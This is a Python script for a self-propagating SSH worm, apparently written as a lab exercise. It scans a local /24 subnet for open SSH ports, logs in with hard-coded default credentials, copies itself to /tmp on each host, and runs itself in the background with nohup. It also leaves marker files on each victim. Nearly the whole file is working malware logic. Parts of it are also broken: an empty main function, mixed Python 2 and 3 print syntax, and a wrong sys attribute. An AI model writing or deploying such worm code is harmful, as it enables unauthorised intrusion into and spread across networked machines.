import paramiko
import sys
import nmap
import os
import os.path

def getHostsOnTheSameNetwork():
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	
		
	return liveHosts

# Open the file and write something to it.
# We will use this as evidence that the worm
# has executed on the remote system

try:
	marker = open("/tmp/marker.txt", "r")
	print ("This has been marked!")
except:

	fileObj = open("/tmp/joseph_porter.txt", "w")

	# Write something to the file
	fileObj.write("Dont forget to place witty remark here...")

	# Close the file
	fileObj.close()

	markerObj = open("/tmp/marker.txt", "w")
	markerObj.write("This is marked")
	markerObj.close()
	print ("Marking this victim now")



for potential in getHostsOnTheSameNetwork():

	try:

		# Create an instance of the SSH client
		ssh = paramiko.SSHClient()

		# Set some parameters to make things easier.
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		# Connect to the remote system.
		ssh.connect(potential, username="ubuntu",password="123456")
		# Create an instance of the SFTP class; used
		# for uploading/downloading files and executing
		# commands.
		sftpClient = ssh.open_sftp()


		# Copy your self to the remote system (i.e. the other VM). We are assuming the
		# password has already been cracked. The worm is placed in the /tmp
		# directory on the remote system.
		sftpClient.put("replicating_worm.py", "/tmp/" + "replicating_worm.py")

		# Make the worm file exeutable on the remote system
		ssh.exec_command("chmod a+x /tmp/replicating_worm.py")

		# Execute the worm!
		# nohup - keep the worm running after we disconnect.
		# python - the python interpreter
		# /tmp/worm.py - the worm script
		# & - run the whole commnad in the background
		ssh.exec_command("nohup python /tmp/replicating_worm.py &")
	except:
		print "This ip is not working: %s" %(str(potential))


def main(args):
	



if __name__ == "__main__":
	main(sys.args)




